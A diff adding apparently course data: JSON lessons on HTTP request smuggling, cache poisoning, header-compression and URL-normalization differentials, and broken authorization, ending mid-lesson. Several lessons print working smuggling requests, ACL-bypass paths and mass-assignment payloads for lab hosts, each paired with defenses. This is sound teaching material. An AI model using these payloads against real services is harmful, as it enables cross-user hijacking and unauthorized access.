@@ -1,0 +1,1102 @@
+[
+  {
+    "id": "web-security-advanced-01",
+    "topic": "web-security-advanced",
+    "number": 1,
+    "title": "HTTP/2 Request Smuggling: The Conversion Boundary",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn how HTTP/2 binary framing is downgraded to HTTP/1.1 at a reverse proxy and how conflicting length signals create a desync.",
+    "objectives": [
+      "Model the HTTP/2-to-HTTP/1.1 downgrade",
+      "Detect H2.CL and H2.TE desync",
+      "Harden the front-end length rewrite"
+    ],
+    "takeaways": [
+      "Frames do not carry lengths the way H1 does",
+      "Downgraded requests can carry two length signals",
+      "The back-end sees a different stream than the front-end"
+    ],
+    "practice": "In a local lab with an HTTP/2 front-end and HTTP/1.1 back-end at <LAB_HOST>, replay a request carrying both a Content-Length and a transfer-encoding header to observe queue desync.",
+    "sources": [],
+    "content": "## Core idea\nHTTP/2 does not use `Content-Length` or `Transfer-Encoding` the way HTTP/1.1 does. A request is a sequence of binary frames: a `HEADERS` frame carrying an HPACK-compressed header block, zero or more `DATA` frames, and an `END_STREAM` flag that marks the true boundary. When a front-end terminates HTTP/2 and speaks HTTP/1.1 to an origin, it must *synthesize* a framing signal. If it copies a client-supplied `Content-Length` or `Transfer-Encoding` header into the downgraded request instead of generating its own, the two layers disagree about where one request ends and the next begins.\n\nThe mental model is a \"translation seam.\" The client thinks in frames, the front-end thinks in headers, and the back-end thinks in bytes. A desync occurs when the seam forwards a length signal it did not compute. Classify variants by what the front-end forwards: **H2.CL** (it keeps an attacker-set `Content-Length`), **H2.TE** (it keeps `Transfer-Encoding: chunked`), and **H2.TE.CL** (it keeps both). Impact is the classic family: request queue poisoning, cache poisoning, or ACL bypass on a shared back-end socket.\n\n### Step-by-step method (lab only)\n1. Confirm the front-end speaks HTTP/2 (ALPN `h2`) while the origin is H1: `curl --http2 -I https://<LAB_HOST>/`.\n2. Capture the exact header block your client emits; note whether a `content-length` pseudo-header is present.\n3. Send a POST whose HEADERS block contains a `content-length` smaller than the DATA frame length. Observe whether the front-end rejects it or forwards it.\n4. Append a smuggled prefix request in the leftover bytes and check whether a later innocent request receives the smuggled response.\n5. Repeat with `transfer-encoding: chunked` in the HEADERS block, using a chunked body that terminates early.\n\n### Concrete example\n```http\nPOST /search HTTP/1.1\nHost: <LAB_HOST>\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGPOST /admin HTTP/1.1\nHost: <LAB_HOST>\n```\nIn an H2.CL lab the HEADERS frame carries `content-length: 6` while the DATA frame carries far more. The front-end forwards `Content-Length: 6`, so the origin reads six bytes, then treats `GPOST /admin...` as the next request line.\n\n| Variant | Front-end forwards | Back-end trusts | Typical result |\n|---|---|---|---|\n| H2.CL | Client CL | CL | Early body truncation |\n| H2.TE | Client TE | Chunked | Prefix smuggling |\n| H2.TE.CL | Both | First wins per parser | Framework-dependent differential |\n\n### Bypass and defense pairs\n- Bypass: lowercase or duplicated `content-length` values that only the origin deduplicates. Defense: strip *all* length and hop-by-hop headers from the H2 block and recompute length from DATA frames.\n- Bypass: `transfer-encoding` smuggled inside a trailer. Defense: reject any HEADERS block containing either length signal.\n\n### Common mistakes\n- Assuming HTTP/2 eliminates smuggling; the downgrade reintroduces it.\n- Testing only CL.TE while the bug lives in the H2 seam.\n- Forgetting that gRPC-over-H2 has no body framing conflict, which makes it a useful control case.\n\n### Knowledge check\n**Q:** Why is `END_STREAM` not a safe substitute for a validated length at the origin?\n**A:** Because the origin speaks H1 and never sees the H2 frame boundary. Only the front-end does; if it forwards attacker-controlled length headers, the origin parses those instead."
+  },
+  {
+    "id": "web-security-advanced-02",
+    "topic": "web-security-advanced",
+    "number": 2,
+    "title": "HTTP/3 and QUIC Smuggling Differentials",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Explore how QUIC streams, QPACK, and mandatory integrity affect request boundary trust when HTTP/3 is translated to older protocols.",
+    "objectives": [
+      "Model HTTP/3 stream boundaries",
+      "Identify translation points that reintroduce H1 framing",
+      "Test QPACK and stream-reset edge cases"
+    ],
+    "takeaways": [
+      "QUIC streams are authoritative only inside the QUIC layer",
+      "Every downgrade re-creates a framing decision",
+      "QPACK dynamic table state can differ across hops"
+    ],
+    "practice": "On a local HTTP/3 lab at <LAB_HOST> behind an HTTP/1.1 origin, vary stream FIN timing and observe how the gateway synthesizes Content-Length.",
+    "sources": [],
+    "content": "## Core idea\nHTTP/3 runs over QUIC, where each request occupies its own stream and the FIN flag closes it. There is no `Content-Length` ambiguity *within* QUIC: the stream length is the message length. Security problems appear at the gateway that translates HTTP/3 to HTTP/1.1 or HTTP/2, because that gateway again has to decide what length to emit. If it mirrors client headers instead of deriving them from stream state, the old H2.CL and H2.TE classes reappear through a new transport.\n\nThe mental model is \"authority per layer.\" Inside QUIC, the transport has authority. After translation, the gateway's configuration has authority. An attacker who can inject a header into the QPACK block may influence the gateway's decision. QPACK uses a dynamic table shared across streams; if a gateway and an origin maintain different table states, header values can be decoded differently on each side. Stream resets (`RESET_STREAM`) can also abandon a body mid-stream: the gateway may have already committed a `Content-Length` while the client abandons the stream, leaving a truncated request that the origin interprets as a new one.\n\n### Step-by-step method (lab only)\n1. Verify HTTP/3 support: `curl --http3 -I https://<LAB_HOST>/`.\n2. Map the chain with a traceroute-style probe: note whether traffic is terminated at an edge, then re-originated over TCP.\n3. Send a POST over H3 with a header block containing `content-length`, then close the stream early with a FIN. Check the origin's view via a debug echo endpoint.\n4. Vary QPACK dynamic-table insertions by sending a prior request that defines a header name as an indexed reference, then reuse that index in a second request.\n5. Test `RESET_STREAM` after sending a partial body and observe whether the gateway forwards the partial request.\n\n### Concrete example\n```http\n:method: POST\n:path: /upload\n:authority: <LAB_HOST>\ncontent-length: 4\ncontent-type: application/x-www-form-urlencoded\n```\nThe QUIC stream actually carries 40 bytes. The gateway trusts the header and emits `Content-Length: 4` downstream. The remaining 36 bytes become a second request at the origin.\n\n| Layer | Authority over length | Failure mode |\n|---|---|---|\n| QUIC stream | FIN / stream size | None if trusted |\n| H3 gateway | Configured rewrite | Mirrors client header |\n| H1 origin | Parsed headers | Reads wrong byte count |\n\n### Bypass and defense pairs\n- Bypass: send `content-length` as a QPACK indexed name that the gateway resolves differently than the client intended. Defense: never forward client-supplied length headers; derive length from stream bytes.\n- Bypass: reset a stream after the gateway has committed framing. Defense: buffer the full stream before emitting downstream.\n\n### Common mistakes\n- Assuming encryption prevents desync; it protects transport, not header semantics.\n- Testing only over TCP and missing H3-only translation paths.\n- Ignoring QPACK state as \"just compression.\"\n\n### Knowledge check\n**Q:** What single rule removes H3-to-H1 desync regardless of QPACK tricks?\n**A:** Derive the downstream length exclusively from bytes actually received on the stream, and strip all client-supplied length headers."
+  },
+  {
+    "id": "web-security-advanced-03",
+    "topic": "web-security-advanced",
+    "number": 3,
+    "title": "CL/TE Edge Cases: Oblivious and Differential Parsers",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study parser-specific decisions when both Content-Length and Transfer-Encoding are present, including oblivious proxies and whitespace tricks.",
+    "objectives": [
+      "Classify CL.TE, TE.CL, and TE.TE behavior",
+      "Exploit whitespace and duplicate-header normalization",
+      "Choose reliable detector payloads"
+    ],
+    "takeaways": [
+      "Two parsers can both be \"correct\" yet disagree",
+      "Oblivious proxies forward conflicting headers untouched",
+      "Header normalization is a security control"
+    ],
+    "practice": "Against a local dual-stack proxy at <LAB_HOST>, craft requests with obfuscated `Transfer-Encoding` tokens to map which layer honors which header.",
+    "sources": [],
+    "content": "## Core idea\nWhen a request carries both `Content-Length` (CL) and `Transfer-Encoding` (TE), RFCs say TE wins and CL should be ignored or rejected. Many real stacks do neither consistently. A front-end that forwards both headers unchanged is *oblivious*; a back-end that prefers CL gives CL.TE; one that prefers chunked gives TE.CL. When both layers prefer chunked but disagree on which token is valid (TE.TE), an obfuscated second token becomes the discriminator. The core skill is not memorizing payloads but mapping *who parses which header first*.\n\nThe mental model is a decision table. Each hop is a parser with a preference order and a normalization step. Whitespace, casing, duplicate headers, and token lists are the inputs to that normalization. `Transfer-Encoding: chunked, foo` is valid to some parsers and rejected by others; a proxy that strips `foo` may turn a rejected request into an accepted one. Similarly, `Content-Length: 5, 5` is deduplicated by some servers into a single value, while others treat it as malformed. These tiny differences are what make desync reliable across heterogeneous chains.\n\n### Step-by-step method (lab only)\n1. Establish a baseline: send a well-formed chunked request and confirm a normal response through <LAB_HOST>.\n2. Probe CL.TE with a body where CL is short and TE chunked is complete; look for a timeout differential (smuggled prefix waiting for more bytes).\n3. Probe TE.CL with a chunked body that ends early and a CL that covers the leftover bytes.\n4. For TE.TE, vary the token: `chunked`, `chunked, foo`, `foo, chunked`, `Chunked`, `chunked ` (trailing space), and a duplicate TE header.\n5. Record each variant's outcome as accepted, rejected, or timed out; the pattern reveals the chain's preference order.\n\n### Concrete example\n```http\nPOST / HTTP/1.1\nHost: <LAB_HOST>\nContent-Length: 4\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n```\nIf the front-end honors CL it forwards four bytes; the origin sees chunked and reads `0` then treats `SMUGGLED` as the next request prefix.\n\n| Pattern | Front-end | Origin | Signal |\n|---|---|---|---|\n| CL.TE | CL | TE | Timeout then response shift |\n| TE.CL | TE | CL | Immediate 400 or desync |\n| TE.TE | First token | Second token | Token-dependent |\n\n### Bypass and defense pairs\n- Bypass: `Transfer-Encoding: chunked, identity`  -  some stacks drop `identity` and accept chunked. Defense: reject any TE header that is not exactly `chunked`.\n- Bypass: duplicate CL headers with different values. Defense: reject duplicate CL outright rather than choosing one.\n\n### Common mistakes\n- Using one canonical payload for every target instead of mapping the chain.\n- Ignoring timeouts as \"the server is down\" when they indicate a waiting parser.\n- Forgetting that HTTP/2 clients cannot emit TE directly; you must use raw sockets or an H1 front-end.\n\n### Knowledge check\n**Q:** If a front-end deduplicates `Content-Length: 4, 4` to `4` but the origin rejects duplicates, which class applies?\n**A:** A normalization differential, not classic CL.TE; the front-end changes the request shape before the origin parses it."
+  },
+  {
+    "id": "web-security-advanced-04",
+    "topic": "web-security-advanced",
+    "number": 4,
+    "title": "Proxy Chains and Desync Propagation",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Trace how a framing error propagates through multiple caches, WAFs, and load balancers, and how to localize the vulnerable hop.",
+    "objectives": [
+      "Map a multi-hop request path",
+      "Localize the hop that changes framing",
+      "Exploit socket reuse across tenants"
+    ],
+    "takeaways": [
+      "Each hop may normalize or forward headers independently",
+      "One bad hop can poison every downstream socket",
+      "Hop locality is found by differential probing"
+    ],
+    "practice": "Build a local chain of two proxies and an origin at <LAB_HOST>, then inject a prefix request and determine which proxy rewrote the length header.",
+    "sources": [],
+    "content": "## Core idea\nReal deployments rarely have a single front-end. A request may pass through a CDN, a WAF, a load balancer, and an application gateway before reaching an origin. Each hop may terminate and re-originate the connection, and each may make its own framing decision. A desync introduced at hop 1 can survive hop 2 unchanged, be \"fixed\" by hop 3, or be amplified when hop 4 reuses a poisoned upstream socket for unrelated tenants. The security boundary is therefore the *set* of connection pools, not individual hosts.\n\nThe mental model is a relay race with batons. Each relay runner (hop) may rewrite the baton (headers). If runner 1 hands off a baton that says \"this package is 10 bytes\" while runner 2 counts 20, the extra 10 bytes become a new package for runner 3. Because connection pools are shared, the misattributed bytes are delivered to whichever user next uses that socket. That is why impact escalates from a single request anomaly to cross-user cache poisoning and credential leakage.\n\n### Step-by-step method (lab only)\n1. Enumerate hops using `Via`, `X-Forwarded-For`, `Server`, and timing differences from <LAB_HOST>.\n2. For each hop, determine whether it terminates TLS and whether it rewrites length headers, using a debug echo service at the origin.\n3. Inject a benign marker prefix (e.g., `X-Marker: hop1`) and see which downstream logs record it.\n4. Force socket reuse: send desync payload, then a request from a \"victim\" session; check whether the victim receives the marker response.\n5. Isolate by disabling hops one at a time in your lab configuration and repeating.\n\n### Concrete example\n```http\nPOST /health HTTP/1.1\nHost: <LAB_HOST>\nContent-Length: 8\nTransfer-Encoding: chunked\n\n0\n\nGET /private HTTP/1.1\nHost: <LAB_HOST>\n```\nHop 1 (CDN) forwards both; hop 2 (LB) honors CL and emits 8 bytes; hop 3 (origin) honors chunked and parses `GET /private` as a fresh request.\n\n| Hop | Behavior | Effect on desync |\n|---|---|---|\n| CDN | Forwards both headers | Preserves |\n| WAF | Rejects duplicates | Blocks |\n| LB | Recomputes CL from TE | Repairs |\n| Origin | Honors CL | Consumes prefix |\n\n### Bypass and defense pairs\n- Bypass: exploit a hop that strips `Transfer-Encoding` but leaves CL, converting TE.CL into CL.TE mid-chain. Defense: every hop must reject conflicting length headers rather than normalize them.\n- Bypass: reuse a poisoned socket across virtual hosts on the same origin pool. Defense: isolate upstream pools per tenant and disable connection reuse where desync is suspected.\n\n### Common mistakes\n- Assuming the WAF protects the origin; WAFs often parse a different framing than the origin.\n- Localizing by host name instead of by connection pool.\n- Testing only the first request after desync instead of the next one on the same socket.\n\n### Knowledge check\n**Q:** Why can a hop that \"fixes\" the header still leave the system vulnerable?\n**A:** Because it may repair framing only for its own connection while a different pool downstream still holds a poisoned socket from earlier traffic."
+  },
+  {
+    "id": "web-security-advanced-05",
+    "topic": "web-security-advanced",
+    "number": 5,
+    "title": "Cache Key Internals and Desync-Driven Poisoning",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Reverse-engineer cache key construction and show how a smuggled prefix can attach attacker content to a victim URL.",
+    "objectives": [
+      "Derive a cache key from headers and cookies",
+      "Find key normalization gaps",
+      "Weaponize a desync into stored poisoning"
+    ],
+    "takeaways": [
+      "The cache key is often narrower than the response-determining inputs",
+      "Vary headers can create split keys",
+      "Poisoning persists until TTL expiry"
+    ],
+    "practice": "In a local lab at <LAB_HOST> with a caching proxy, inject a response via smuggling and confirm a different session receives it from cache.",
+    "sources": [],
+    "content": "## Core idea\nA cache stores responses under a *key* built from selected request attributes, typically method, host, and path, sometimes plus `Accept-Encoding`, cookies, or query parameters. The response, however, is determined by the full request. Whenever the key omits an input that changes the response, two different requests collide. Desync turns this from a theoretical collision into a write primitive: a smuggled prefix can cause the cache to store an attacker-chosen response body under a victim's key.\n\nThe mental model is a hash map with a lossy key. Think of the key function as a fingerprint that ignores certain fingers. You first reverse-engineer which attributes are in the fingerprint by observing `Age`, `X-Cache`, and `CF-Cache-Status` headers while varying one input at a time. Then you find an input that changes the response but not the fingerprint. Finally, via desync you control the response that gets stored on the next request, so the victim's ordinary GET retrieves your content.\n\n### Step-by-step method (lab only)\n1. At <LAB_HOST>, vary query strings, headers (`Accept`, `X-Forwarded-Host`), and cookies one at a time; watch for cache HIT/MISS flips.\n2. Identify an unkeyed input that affects response content (e.g., `X-Forwarded-Host` reflected in a canonical URL).\n3. Determine the cache's handling of `Vary`: a missing `Vary: Accept-Encoding` means gzip and identity responses share a key.\n4. Use a smuggling primitive to deliver a response whose body contains attacker markup, and have it stored under the victim path.\n5. Fetch the victim path in a clean session and confirm the poisoned body is served with a fresh `Age`.\n\n### Concrete example\n```http\nGET /home HTTP/1.1\nHost: <LAB_HOST>\nX-Forwarded-Host: evil.example\n\nHTTP/1.1 200 OK\nAge: 2\nX-Cache: HIT\n```\nIf `X-Forwarded-Host` is unkeyed but reflected into a `<link rel=canonical>` tag, every visitor to `/home` receives attacker-controlled markup until purge.\n\n| Key input | Usually keyed? | Risk when omitted |\n|---|---|---|\n| Method + path | Yes | Low |\n| Query string | Sometimes | Parameter pollution |\n| Accept-Encoding | Often | Compression differential |\n| X-Forwarded-* | Rarely | Host-header poisoning |\n\n### Bypass and defense pairs\n- Bypass: add a duplicate query parameter so the cache key uses the first value while the app uses the last. Defense: canonicalize parameters before both keying and routing.\n- Bypass: exploit a `Vary` header that lists a header the cache ignores. Defense: include every response-influencing header in the key.\n\n### Common mistakes\n- Assuming query strings are always keyed.\n- Confusing browser cache with shared cache; only shared caches create cross-user impact.\n- Forgetting to wait for TTL or to send a cache-busting request during verification.\n\n### Knowledge check\n**Q:** What condition must hold for poisoning to be cross-user rather than self-only?\n**A:** The poisoned response must be stored under a key the victim's requests also produce, and the cache must be shared."
+  },
+  {
+    "id": "web-security-advanced-06",
+    "topic": "web-security-advanced",
+    "number": 6,
+    "title": "HPACK and QPACK Header Compression Differentials",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Investigate how compression context desynchronization between hops can alter headers after decoding.",
+    "objectives": [
+      "Explain dynamic table state across hops",
+      "Craft index-based header references",
+      "Detect decoder state divergence"
+    ],
+    "takeaways": [
+      "Compressed headers are stateful references, not literal strings",
+      "Different table states decode to different headers",
+      "Compression is part of the trust boundary"
+    ],
+    "practice": "In a local H2 lab at <LAB_HOST>, intentionally desync the HPACK table between a proxy and origin and observe header reinterpretation.",
+    "sources": [],
+    "content": "## Core idea\nHPACK (HTTP/2) and QPACK (HTTP/3) compress headers using a static table plus a dynamic table populated by previous requests. A compressed header is not a string; it is an instruction such as \"emit the name at index 12 with this literal value.\" If two hops maintain different dynamic table states, the same bytes decode to different headers on each side. That is a compression differential, and it is especially dangerous because the front-end's decoded view (used for routing or ACLs) may differ from the origin's view (used for application logic).\n\nThe mental model is a shared dictionary with two independent copies. If a proxy inserts `:authority: <LAB_HOST>` at index 62 but the origin never saw that insertion, a later reference to index 62 yields different values. QPACK adds a further wrinkle: its dynamic table is explicitly acknowledged via `SETTINGS_HEADER_TABLE_SIZE` and stream acknowledgements, so a gateway that delays acknowledgements can desynchronize table state across streams. Header size limits also interact: a proxy that enforces a smaller max header list may truncate a decoded block differently than the origin.\n\n### Step-by-step method (lab only)\n1. From <LAB_HOST>, send a request that inserts several large headers into the dynamic table, establishing a known baseline.\n2. Send a follow-up request referencing those indices with literal values, using a raw H2 client (`h2spec` or a custom frame builder).\n3. Compare the origin's decoded header log with the proxy's access log.\n4. For QPACK, vary acknowledgement timing by introducing stream delays and observe whether decoded values diverge.\n5. Test header list size limits by padding a value near the configured maximum and checking for differential truncation.\n\n### Concrete example\n```text\nHEADERS frame (HPACK):\n  0x82                 :method GET (static index 2)\n  0xBE 0x3E ...         indexed name 62, literal value \"/admin\"\n```\nIf index 62 at the proxy is `:path` but at the origin is `:authority`, the proxy routes `/admin` while the origin sees an authority change.\n\n| State | Proxy table | Origin table | Decoded result |\n|---|---|---|---|\n| Synced | Same | Same | Identical headers |\n| Divergent | Different | Different | ACL bypass possible |\n| QPACK unacked | Advanced | Not advanced | Scheduled decode stalls |\n\n### Bypass and defense pairs\n- Bypass: force table divergence with a header the proxy inserts but the origin rejects. Defense: reset compression context per connection at trust boundaries.\n- Bypass: exploit size-limit truncation to cut a header mid-value. Defense: reject decoded header lists that exceed limits rather than truncating.\n\n### Common mistakes\n- Treating compression as transparent and therefore untestable.\n- Using high-level clients that hide frame-level control.\n- Ignoring SETTINGS frames as security-relevant configuration.\n\n### Knowledge check\n**Q:** Why can an ACL enforced at the proxy be bypassed by compression divergence?\n**A:** Because the proxy's decoded header value may differ from the origin's decoded value; the ACL checks one interpretation while the app uses another."
+  },
+  {
+    "id": "web-security-advanced-07",
+    "topic": "web-security-advanced",
+    "number": 7,
+    "title": "Reverse Proxy Normalization Differentials",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how proxies normalize paths, schemes, and absolute URIs differently from origins, enabling ACL and routing bypasses.",
+    "objectives": [
+      "Map URL normalization steps across hops",
+      "Exploit encoded and absolute-form differences",
+      "Align proxy and origin parsing"
+    ],
+    "takeaways": [
+      "Normalization order is security-critical",
+      "Absolute-form URIs can hide the real path",
+      "encodings are decoded at different stages"
+    ],
+    "practice": "On a local lab at <LAB_HOST>, probe `/admin`, `/%61dmin`, and absolute-form requests to compare proxy and origin path views.",
+    "sources": [],
+    "content": "## Core idea\nBefore a request reaches application code, each hop normalizes the URL: decoding percent-encodings, collapsing dot segments, resolving duplicate slashes, and choosing between origin-form and absolute-form. The *order* of these operations matters. A proxy that decodes `%2e%2e` before collapsing dot segments sees a different path than an origin that collapses first and decodes later. Such normalization differentials can bypass path-based ACLs, route a request to a different internal service, or defeat a WAF signature.\n\nThe mental model is a pipeline of transformations with no shared specification of ordering. You can think of each hop as a function `f_i(path)`. The proxy enforces `ACL(f_proxy(path))` while the application dispatches on `f_origin(path)`. You win when `f_proxy(path)` is benign and `f_origin(path)` is sensitive. Absolute-form requests (`GET http://<LAB_HOST>/admin HTTP/1.1`) add another dimension: some proxies parse the authority from the absolute URI while others use the Host header, allowing a mismatch that confuses virtual-host routing.\n\n### Step-by-step method (lab only)\n1. Send a baseline request to <LAB_HOST> and record the origin's logged path via a debug endpoint.\n2. Probe encodings: `/admin`, `/%61dmin`, `/%2fadmin`, `/admin%2f`, `/a/../admin`, `//admin`.\n3. Probe absolute-form and compare the Host header to the URI authority.\n4. Use a header that only the proxy adds (e.g., `X-Original-URL`) and see whether the origin honors it.\n5. Compare which hop makes the routing decision and which makes the authorization decision; the gap is the exploitable surface.\n\n### Concrete example\n```http\nGET /%2e%2e/admin HTTP/1.1\nHost: <LAB_HOST>\nX-Original-URL: /public\n```\nProxy decodes to `/../admin`, collapses to `/admin`, blocks by ACL. Origin sees `/%2e%2e/admin` and its framework decodes to `/admin` *after* routing to the admin handler  -  a mismatch if ACL and dispatch use different functions.\n\n| Input | Proxy view | Origin view | Risk |\n|---|---|---|---|\n| `/%61dmin` | `/admin` or literal | `/admin` | ACL bypass |\n| `//admin` | `/admin` | `//admin` | Route mismatch |\n| Absolute URI | Authority from URI | Authority from Host | Vhost confusion |\n\n### Bypass and defense pairs\n- Bypass: mixed encoding (`%252e%252e`) that only one hop double-decodes. Defense: decode exactly once, canonicalize, then authorize on the canonical form.\n- Bypass: `X-Original-URL` header trusted by a framework that the proxy does not sanitize. Defense: strip all internal routing headers at the edge.\n\n### Common mistakes\n- Testing only percent-encoding and missing dot-segment ordering.\n- Authorizing on the raw path while routing on the decoded path.\n- Assuming the WAF and application share a URL parser.\n\n### Knowledge check\n**Q:** Why is \"decode, then canonicalize, then authorize\" safer than \"authorize, then decode\"?\n**A:** Because authorization runs on the same canonical string the application will dispatch on, eliminating the parser-order gap."
+  },
+  {
+    "id": "web-security-advanced-08",
+    "topic": "web-security-advanced",
+    "number": 8,
+    "title": "Connection-State Desync and Response Queue Poisoning",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn how leftover bytes on a persistent connection cause responses to be delivered to the wrong user, and how to verify impact safely.",
+    "objectives": [
+      "Understand persistent connection pooling",
+      "Turn a prefix smuggle into queue poisoning",
+      "Verify cross-request impact in a lab"
+    ],
+    "takeaways": [
+      "HTTP keep-alive makes responses and requests positional",
+      "One poisoned socket affects the next user of that socket",
+      "Timing reveals hidden queues"
+    ],
+    "practice": "In a local lab at <LAB_HOST>, smuggle a request that generates a distinctive response, then issue a victim request and observe the shift.",
+    "sources": [],
+    "content": "## Core idea\nHTTP/1.1 keep-alive multiplexes sequential requests over one TCP connection. Requests and responses are matched by *order*, not by an explicit ID. If you can inject a partial request whose bytes are interpreted as the start of the next request, you add an extra entry to the response queue. Every subsequent response is shifted by one. When the origin pool is shared, the \"next user\" of that socket is an arbitrary visitor, which turns a framing bug into cross-user information disclosure or session hijacking.\n\nThe mental model is a queue with no labels. The origin reads request N from the socket and writes response N back. If you smuggle a complete request as a prefix, the origin answers it with response N+1; the legitimate request N+1 now receives response N+2. To verify safely in a lab, make the smuggled response uniquely identifiable, such as a static marker page, then show that a clean client receives that marker on an unrelated URL.\n\n### Step-by-step method (lab only)\n1. Establish a baseline sequence of requests through <LAB_HOST> and record response order.\n2. Send a smuggling payload whose prefix is a complete request to a marker endpoint.\n3. Immediately send a benign request from a second client and observe whether it receives the marker response.\n4. Use a long delay in the smuggled handler to create a measurable timing gap, confirming an extra queued response.\n5. Repeat with connection reuse disabled on the client to confirm the effect is server-side.\n\n### Concrete example\n```http\nPOST / HTTP/1.1\nHost: <LAB_HOST>\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGET /marker HTTP/1.1\nHost: <LAB_HOST>\nX: \n```\nThe trailing `X: ` header leaves the smuggled request incomplete, so the next legitimate request's headers complete it  -  a classic queue-poisoning setup.\n\n| Observation | Meaning |\n|---|---|\n| Extra response with `Age: 0` | Smuggled response queued |\n| Next request gets wrong body | Positional mismatch confirmed |\n| Timeout of ~N seconds | Handler waiting for finishing bytes |\n\n### Bypass and defense pairs\n- Bypass: use a HEAD request as the smuggled prefix so the origin suppresses the body and the shift is silent. Defense: reject conflicting framing before any handler runs.\n- Bypass: target an internal admin path reachable only from the origin's network position. Defense: authenticate at the application layer, not by network origin alone.\n\n### Common mistakes\n- Concluding \"not vulnerable\" when the smuggled request simply timed out.\n- Using a victim request that itself errors, masking the shift.\n- Testing on a single connection without confirming shared pooling.\n\n### Knowledge check\n**Q:** Why does disabling client-side keep-alive not fix a server-side queue poisoning issue?\n**A:** Because the poisoned socket lives in the server's upstream connection pool; the client's connection settings do not change how the origin reuses its own sockets."
+  },
+  {
+    "id": "web-security-advanced-09",
+    "topic": "web-security-advanced",
+    "number": 9,
+    "title": "BOLA and BFLA at Scale: The Subject-Object-Action Matrix",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Treat broken object-level and function-level authorization as a systematic matrix problem rather than a per-endpoint bug hunt.",
+    "objectives": [
+      "Distinguish BOLA from BFLA",
+      "Build a reusable cross-account test matrix",
+      "Detect mass-assignment privilege escalation"
+    ],
+    "takeaways": [
+      "Object IDs do not grant authorization",
+      "Every action needs a policy check",
+      "Sequential or UUID IDs are equally unsafe without checks"
+    ],
+    "practice": "Using two owned accounts on a local app at <LAB_HOST>, replay every identified object ID with the other account's token and record the results.",
+    "sources": [],
+    "content": "## Core idea\nBOLA (Broken Object Level Authorization) asks \"may this subject access this object?\" BFLA (Broken Function Level Authorization) asks \"may this subject perform this action?\" They are different axes of the same matrix: subjects x objects x actions. A secure service checks the specific cell before executing. An insecure service checks a few cells and assumes the rest are implied by a hidden front-end button, an unguessable identifier, or a single role check at login.\n\nThe mental model is a spreadsheet with a row for each user, a column for each object, and an action label per cell. Most teams validate only that the user is logged in, which is a check on the row header, not on the cell. At scale, this fails because endpoints multiply: each new export, search, bulk-delete, and webhook adds cells that nobody explicitly authorized. The fix is to make the policy check mandatory in the data-access layer so it cannot be forgotten.\n\n### Step-by-step method (lab only)\n1. Create accounts A and B in your owned lab at <LAB_HOST> and capture both tokens.\n2. Enumerate every endpoint accepting an identifier: path, query, body, header, and GraphQL argument.\n3. For each endpoint, replay A's object identifiers with B's token and record status, body, and side effects.\n4. Repeat for verbs: GET, PUT, PATCH, DELETE, and method-override headers.\n5. Test mass assignment by adding privileged fields (`role`, `owner_id`, `is_admin`) to otherwise legitimate JSON bodies.\n\n### Concrete example\n```http\nGET /api/v2/users/1042/invoices HTTP/1.1\nHost: <LAB_HOST>\nAuthorization: Bearer <TOKEN_B>\n```\nA `200` with invoices belonging to user 1042 (who is A) proves object-level failure. A mass-assignment probe:\n```json\n{\"displayName\":\"Bob\",\"role\":\"admin\",\"owner_id\":\"<UUID_B>\"}\n```\nIf `role` is silently accepted, a function-level escalation exists.\n\n| Flaw | Question failed | Typical evidence |\n|---|---|---|\n| BOLA | Subject vs object | Other user's record returned |\n| BFLA | Subject vs action | Normal user calls admin endpoint |\n| Mass assignment | Subject vs field | Privileged field persisted |\n\n### Bypass and defense pairs\n- Bypass: UUIDs assumed unguessable but leaked through logs or `Referer`. Defense: authorize on every identifier regardless of entropy.\n- Bypass: `X-HTTP-Method-Override: DELETE` bypassing a method-based guard. Defense: enforce policy independent of verb.\n\n### Common mistakes\n- Testing only GET endpoints and missing state-changing operations.\n- Assuming a single 403 means the whole endpoint family is safe.\n- Forgetting that \"read\" is itself a privileged action.\n\n### Knowledge check\n**Q:** Why does switching IDs from integers to UUIDs not fix BOLA?\n**A:** Because authorization is about permission, not guessability; an object reference that leaks through any channel is still unauthorized access."
+  },
+  {
+    "id": "web-security-advanced-10",
+    "topic": "web-security-advanced",
+    "number": 10,
+    "title": "Tenant Isolation and Row-Level Security",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Learn to verify that every data path carries an enforceable tenant predicate, including caches, search indices, and background jobs.",
+    "objectives": [
+      "Map all tenant-scoped data paths",
+      "Verify database-enforced isolation",
+      "Find cross-tenant leaks in async systems"
+    ],
+    "takeaways": [
+      "Isolation must be enforced at the data layer",
+      "Every derived store needs a tenant dimension",
+      "Impersonation headers must never set scope"
+    ],
+    "practice": "In a lab at <LAB_HOST> with two tenants, query reports, exports, and cached pages to confirm no cross-tenant data is reachable.",
+    "sources": [],
+    "content": "## Core idea\nMulti-tenant security rests on a single invariant: every query, cache entry, index lookup, and job payload is scoped to the authenticated tenant. When scope is a convention in application code, one forgotten `WHERE` clause breaks isolation. When scope is enforced by the database through row-level security (RLS), the predicate is attached to the table and survives application changes. The mental model is a tenant boundary implemented as a mandatory filter that the runtime injects, not as a value developers remember to pass.\n\nThe failure surface is wider than SQL. Search indices, object storage, analytics pipelines, webhooks, and WebSocket subscriptions are all derived stores that need their own tenant dimension. A report export may run in a background job where no authenticated user exists, so the job must carry tenant context explicitly. A cache key that omits tenant allows tenant B to receive tenant A's rendered page.\n\n### Step-by-step method (lab only)\n1. Enumerate all data access paths at <LAB_HOST>: ORM queries, raw SQL, search, cache, exports, and async jobs.\n2. For each path, identify where tenant scope originates and whether the storage layer enforces it.\n3. Using two owned tenants, replay identifiers and query parameters across boundaries.\n4. Inspect cache keys and index documents for a tenant field.\n5. Trigger a background job with tenant B context and verify it cannot read tenant A rows.\n\n### Concrete example\n```http\nGET /api/v1/reports?tenant_id=TENANT_A HTTP/1.1\nHost: <LAB_HOST>\nAuthorization: Bearer <TOKEN_B>\n```\nIf TENANT_A's report is returned, the handler trusts a client-supplied scope. A 